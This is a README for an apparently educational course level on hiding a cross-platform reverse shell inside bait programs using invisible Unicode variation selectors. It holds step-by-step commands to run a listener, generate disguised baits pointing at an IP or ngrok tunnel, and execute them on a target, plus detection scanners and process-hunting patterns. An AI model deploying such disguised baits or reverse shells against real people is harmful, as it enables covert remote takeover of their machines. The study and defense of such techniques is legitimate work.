# Level 3: Reverse Shell with Unicode Steganography

[Back to main](../README.md) | [← Level 2](../level_2/)

---

## Table of Contents

- [What will you learn in this level?](#what-will-you-learn-in-this-level)
- [What is a reverse shell?](#what-is-a-reverse-shell)
- [How it works in this project](#how-it-works-in-this-project)
- [File structure](#file-structure)
- [Usage](#usage)
- [Network configuration](#network-configuration)
- [If you ran the bait by mistake](#if-you-ran-the-bait-by-mistake)
- [Payload characteristics](#payload-characteristics)
- [Relationship with previous levels](#relationship-with-previous-levels)

---

## What will you learn in this level?

- How Unicode steganography is used to hide a full **reverse shell**
- How a reverse shell works: listener, payload, and bait
- How to generate "bait" files that look like normal programs but execute hidden code
- How to **detect and defend** against this type of attack

**Prerequisites**: having completed [Level 1](../level_1/) and [Level 2](../level_2/) to understand the encoding techniques.

---

## What is a reverse shell?

A **reverse shell** is when a target computer connects back to the attacker's computer and gives access to its terminal (shell). Unlike a normal shell where you connect to the server, here the server connects to you.

```
┌─────────────────────┐                    ┌─────────────────────┐
│  YOUR PC (attacker)  │                    │  TARGET PC (bait)   │
│                     │                    │                     │
│  Listener           │◄───── connection ──│  Bait executed      │
│  Listening on :4444 │                    │  Connects to        │
│  Receives the shell │                    │  your IP:4444       │
└─────────────────────┘                    └─────────────────────┘
```

### Why "reverse"?

Because the connection goes in the opposite direction to normal:
- **Normal shell**: you connect to the server → the server's firewall can block you
- **Reverse shell**: the server connects to you → the server's firewall allows outbound traffic (almost always)

Firewalls generally block **inbound** connections but allow **outbound** ones. That is why attackers use reverse shells: the payload on the victim initiates an outbound connection, which is rarely blocked.

---

## How it works in this project

This project combines the **Level 2** technique (Variation Selectors) with a real but benign reverse shell:

### 1. The payload

A script that:
- Detects the OS (Windows/macOS/Linux)
- Opens a shell (PowerShell, bash, zsh, etc.)
- Connects to your listener
- Runs as a detached background process
- Automatically reconnects if it loses connection

All of this is encoded with Variation Selectors and hidden inside an "empty" string.

### 2. The bait

A file that looks like a useful program (an emulator, a hex converter, etc.). The file works normally and prints real results. But when executed, it also decodes and runs the hidden payload in the background, without the user noticing.

### 3. The listener

Your program that waits for the connection. When the bait is executed on the target computer, the payload connects to your listener and gives you access to the remote shell.

---

## File structure

```
level_3/
├── python/
│   ├── bait_generator.py        # Generates bait files with hidden payload
│   ├── rs_listener.py           # Listener to receive the connection
│   └── Bait To Client/          # Generated baits go here
│
├── javascript/
│   ├── bait_generator.js
│   ├── rs_listener.js
│   └── Bait To Client/
│
└── csharp/
    ├── BaitGenerator.cs
    └── rs_listener.cs
```

---

## Usage

All commands assume you are inside the `level_3/` folder.

### Step 1: Start the listener (on YOUR computer)

The listener must be running BEFORE the bait is executed.

```bash
# Python:
cd python
python rs_listener.py

# JavaScript:
cd javascript
node rs_listener.js
```

You will see your local IP. Write it down for the next step.

### Step 2: Generate the baits

The generator needs the IP and port where your listener is running:

```bash
# Python (two options, use either one):
python bait_generator.py 192.168.1.6 4444
python bait_generator.py --ip 192.168.1.6 --port 4444

# JavaScript (two options, use either one):
node bait_generator.js 192.168.1.6 4444
node bait_generator.js --ip 192.168.1.6 --port 4444
```

This generates 2 bait files in the `Bait To Client/` folder:

| File | What it looks like | How it hides the payload |
|------|--------------------|--------------------------|
| `bait_emulator` | An emulator | `exec()`/`eval()` justified by the design |
| `bait_utils/bait_hex` | A conversion utility | `exec()`/`eval()` hidden at the end of a long line |

### Step 3: Execute the bait (on the TARGET PC)

```bash
# Python (2 options, pick 1):
python bait_emulator.py # or: python bait_utils.py

# JavaScript (2 options, pick 1):
node bait_emulator.js # or: node bait_utils.js
```

The bait works normally (prints results), but in the background it launches the reverse shell that connects to your listener.

### Step 4: Detect the attack (defense)

The project's [defense scanners](../defense/) detect invisible characters in any file. From the **project root**:

```bash
# Python:
python defense/python/unicode_scanner.py --decode "level_3/python/Bait To Client/bait_emulator.py"

# JavaScript:
node defense/javascript/unicode_scanner.js --decode "level_3/javascript/Bait To Client/bait_emulator.js"

# Scan an entire folder:
python defense/python/unicode_scanner.py --decode "level_3/python/Bait To Client"
```

For more defense strategies, see [Defense and Detection Strategies](../README.md#defense-and-detection-strategies) in the main README.

---

## Network configuration

Depending on where the two computers are located:

| Scenario | IP for the generator | Port | Example |
|----------|---------------------|------|---------|
| Same network (same home/office) | Your local IP | `4444` | `192.168.1.6 4444` |
| Different networks (with tunnel) | Tunnel URL | Tunnel port | `8.tcp.ngrok.io 10914` |
| Same PC (testing) | `127.0.0.1` | `4444` | `127.0.0.1 4444` |

For different networks, you need a tunnel like [ngrok](https://ngrok.com/):

```bash
# 1. Open tunnel:
ngrok tcp 4444

# 2. Use the URL and port ngrok provides:
python bait_generator.py 8.tcp.ngrok.io 10914
```

---

## If you ran the bait by mistake

The payload launches a detached process that keeps running in the background.

### Find and kill the process

**Windows (PowerShell)**:
```powershell
# Identify
Get-CimInstance Win32_Process | Where {
    ($_.Name -eq 'node.exe' -and $_.CommandLine -match 'net\.connect') -or
    ($_.Name -eq 'python.exe' -and $_.CommandLine -match 'b64decode')
} | Select @{Name='PID';Expression={$_.ProcessId}}, Name | Format-List

# Kill (replace XXXX with the PID)
kill -Id XXXX
```

**Linux/macOS**:
```bash
# Identify
ps aux | grep -E '(python.*-c.*b64decode|node.*-e.*net\.connect)' | grep -v grep

# Kill (replace XXXX with the PID)
kill XXXX
```

---

## Payload characteristics

- **Cross-platform**: Windows (pwsh/powershell/cmd), macOS (zsh/bash), Linux (bash/sh)
- **Detached process**: survives terminal closure
- **Reconnect with backoff**: 5s initial, +3s per attempt, reset to 5s after 60s
- **Maximum duration**: 7 days
- **System fingerprint**: OS, Shell, User, Hostname, Architecture, CWD, PID
- **UTF-8 encoding**: configured via shell startup arguments

---

## Relationship with previous levels

| Level | Technique | Use in this level |
|-------|-----------|-------------------|
| Level 1 | Zero-Width binary (8 chars/byte) | Not used directly; serves as the theoretical foundation |
| Level 2 | Variation Selectors (1 char/byte) | Used to encode the payload in the baits |
| Level 3 | Real-world application | Payload + baits + listener + defense |

The bait generator uses **Variation Selectors** (Level 2) to encode the payload because it is 8 times more compact. A typical payload weighs ~3,900 invisible characters with Variation Selectors, versus ~31,000 if it used the binary technique from Level 1.
